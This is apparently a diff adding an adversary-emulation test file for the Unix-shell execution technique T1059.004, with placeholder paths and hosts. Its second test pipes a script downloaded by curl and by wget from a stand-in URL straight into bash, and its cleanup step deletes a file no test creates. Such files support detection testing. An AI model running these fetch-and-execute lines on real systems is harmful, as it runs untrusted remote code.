@@ -1,0 +1,19 @@
+attack_technique: T1059.004
+atomic_tests:
+- name: Create and Execute Bash Shell Script
+  input_arguments:
+    script_path:
+      default: /home/custom/custom.sh
+  executor:
+    command: |
+      sh -c "echo 'echo Hello from custom' > #{script_path}"
+      sh -c "echo 'ping -c 4 cu.st.om.e' >> #{script_path}"
+      chmod +x #{script_path}
+      sh #{script_path}
+- name: Command-Line Interface
+  executor:
+      command: |
+        curl -sS https://this.is.a.custom.url/custom/custom.sh | bash
+        wget --quiet -O - https://this.is.a.custom.url/custom/custom.sh | bash
+      cleanup_command: |
+        rm /tmp/custom-fish.txt
